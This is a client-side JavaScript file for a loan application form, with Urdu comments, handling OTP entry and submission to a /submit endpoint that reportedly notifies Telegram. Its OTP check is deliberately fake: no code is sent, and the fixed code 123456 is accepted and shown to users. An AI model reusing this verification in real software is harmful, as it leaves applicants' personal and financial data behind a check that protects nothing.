const form = document.getElementById("loanForm");
let otpVerified = false;

const mobileInput = document.querySelector('input[name="mobile"]');
const verifyOtpBtn = document.getElementById("verifyOtpBtn");
const resendOtpBtn = document.getElementById("resendOtpBtn");

function showMessage(msg, isError = false) {
  alert(msg);
  if (isError) console.error(msg);
}

// 1. کوڈ بھیجنے کا فرضی لاجک (سرور پر ریکوئسٹ نہیں جائے گی)
async function sendOTP() {
  const mobile = mobileInput.value.trim();

  if (!mobile) {
    showMessage("Please enter mobile number first");
    return;
  }

  // بغیر کسی سرور کے ڈائریکٹ کامیابی کا میسج دکھائیں
  showMessage("OTP sent successfully. (Use temporary code: 123456)");
}

mobileInput.addEventListener("blur", sendOTP);
resendOtpBtn.addEventListener("click", sendOTP);

// 2. او ٹی پی وریفائی کرنے کا فرضی لاجک (کوڈ 123456 فکس کر دیا گیا ہے)
verifyOtpBtn.addEventListener("click", async () => {
  const mobile = mobileInput.value.trim();
  const otp = [...document.querySelectorAll(".otp-digit")]
    .map((input) => input.value)
    .join("");

  if (!mobile) {
    showMessage("Please enter your mobile number first");
    return;
  }

  if (otp.length !== 6) {
    showMessage("Please enter the full 6-digit OTP");
    return;
  }

  // اگر صارف 123456 ٹائپ کرے گا تو وریفائی ہو جائے گا
  if (otp === "123456") {
    otpVerified = true;
    verifyOtpBtn.textContent = "Verified";
    verifyOtpBtn.disabled = true;
    showMessage("OTP verified successfully");
  } else {
    showMessage("Invalid OTP code. Please use '123456' for testing.", true);
  }
});

document.querySelectorAll(".otp-digit").forEach((input, index, arr) => {
  input.addEventListener("input", (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, "").slice(0, 1);

    if (e.target.value && index < arr.length - 1) {
      arr[index + 1].focus();
    }
  });

  input.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && !e.target.value && index > 0) {
      arr[index - 1].focus();
    }
  });
});

// 3. فارم سبمٹ کرنے کا لاجک
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!otpVerified) {
    showMessage("Please verify OTP before submitting");
    return;
  }

  const formData = Object.fromEntries(new FormData(form).entries());

  try {
    const response = await fetch("/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(formData)
    });

    const data = await response.json();

    if (!response.ok) {
      showMessage(data.error || "Submission failed", true);
      return;
    }

    showMessage("Application submitted successfully. Telegram notified.");
    form.reset();
    otpVerified = false; // فارم ری سیٹ ہونے پر او ٹی پی بھی ری سیٹ ہو جائے گا
    verifyOtpBtn.textContent = "Verify OTP";
    verifyOtpBtn.disabled = false;
  } catch (error) {
    showMessage("Submission failed", true);
  }
});
